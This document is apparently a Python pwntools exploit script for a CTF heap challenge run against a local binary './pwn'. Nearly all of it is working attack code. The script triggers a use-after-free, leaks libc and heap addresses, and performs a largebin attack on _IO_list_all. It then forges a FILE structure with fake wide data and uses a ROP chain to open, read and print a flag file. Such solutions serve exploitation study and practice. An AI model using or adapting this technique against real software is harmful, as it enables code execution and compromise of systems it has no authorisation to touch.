from pwn import *

r=process("./pwn")
libc=ELF("./libc.so.6")

def add_(index,size):
	r.recvuntil(b"Your choice >> ")
	r.sendline(str(1))
	r.recvuntil("Index:")
	r.sendline(str(index))
	r.recvuntil("Size:")
	r.sendline(str(size))
	return

def del_(index):
	r.recvuntil(b"Your choice >> ")
	r.sendline(str(2))
	r.recvuntil("Index:")
	r.sendline(str(index))
	return

def edi_(index,size,text):
	r.recvuntil(b"Your choice >> ")
	r.sendline(str(3))
	r.recvuntil("Index:")
	r.sendline(str(index))
	r.recvuntil("Size:")
	r.sendline(str(size))
	r.send(text)
	return

def show_(index):
	r.recvuntil(b"Your choice >> ")
	r.sendline(str(4))
	r.recvuntil("Index:\n")
	r.sendline(str(index))
	return
pause()
add_(16,0x458)

add_(0,0x460)
add_(1,0x438)
add_(2,0x430)

context.log_level='debug'
r.recvuntil("Your choice >> ")
r.sendline(str(20006176))
r.recvuntil("Index:")
r.sendline("0")#del with uaf

add_(3,0x470)
show_(0)
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-0x21B0E0

edi_(0,0x10,b'a'*0x10)
show_(0)
r.recvuntil(b'a'*0x10)
heap_add=u64(r.recv(6).ljust(8,b'\x00'))

print(hex(heap_add))
print(hex(libc_base))

edi_(0,0x20,b'a'*0x18+p64(libc_base+libc.sym["_IO_list_all"]-0x20))
del_(2)
pause()
add_(4,0x478)
print(hex(libc.sym["_IO_list_all"]+libc_base))


add_(5,0x430)
#0,4

chunk0_add=heap_add
print(hex(chunk0_add))
wide_data_add=chunk0_add+0x1170+0x10
add_1=wide_data_add+0x88

rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdx_add=0x11f2e7+libc_base #pop rdx; pop r12; ret;
ret_add=0x1296c5+libc_base
rsp_add=0x35732+libc_base
rbp_add=0x2a2e01+libc_base 
rax_add=0x45eb0+libc_base
syscall=0x91316+libc_base
setcontext_add=libc.sym["setcontext"]+61+libc_base
svcudp_reply=0x17923D+libc_base
swapcontext=0x5814D+libc_base

fake_file = b''
fake_file = p64(0)*3+p64(1)
fake_file = fake_file.ljust(0x90,b'\x00')+p64(wide_data_add) #设为伪造的wide_data地址
fake_file = fake_file.ljust(0xc8,b'\x00')+p64(libc_base+libc.sym["_IO_wfile_jumps"])

edi_(0,0x430,fake_file)


payload=b''
payload += p64(rsp_add) + p64(wide_data_add+0x210)
payload=payload.ljust(0x38,b'\x00')
payload=payload.ljust(0xe0,b'\x00') + p64(wide_data_add+0xe8-0x68) + p64(0x5a120+libc_base) # mov rsp, rdx ; ret (前面那个是需要call的地址的指针）
payload=payload.ljust(0x200,b'\x00')+b'flag'
payload=payload.ljust(0x210,b'\x00')

payload += p64(rdi_add) + p64(0xFFFFFFFFFFFFFF9C)      
payload += p64(rsi_add) + p64(wide_data_add+0x200) 
payload += p64(rdx_add) + p64(0) + p64(0)    
payload += p64(rax_add) + p64(257)      
payload += p64(syscall)                 

payload += p64(rdi_add) + p64(3)        
payload += p64(rsi_add) + p64(wide_data_add+0x300) 
payload += p64(rdx_add) + p64(100)+p64(0)      
payload += p64(rax_add) + p64(0)        
payload += p64(syscall)                  
payload += p64(rdi_add) + p64(1)         
payload += p64(rsi_add) + p64(wide_data_add+0x300) 
payload += p64(rdx_add) + p64(100)+p64(0)       
payload += p64(rax_add) + p64(1)         
payload += p64(syscall)       
          
edi_(4,0x500,payload)
print(hex(wide_data_add))
r.interactive()
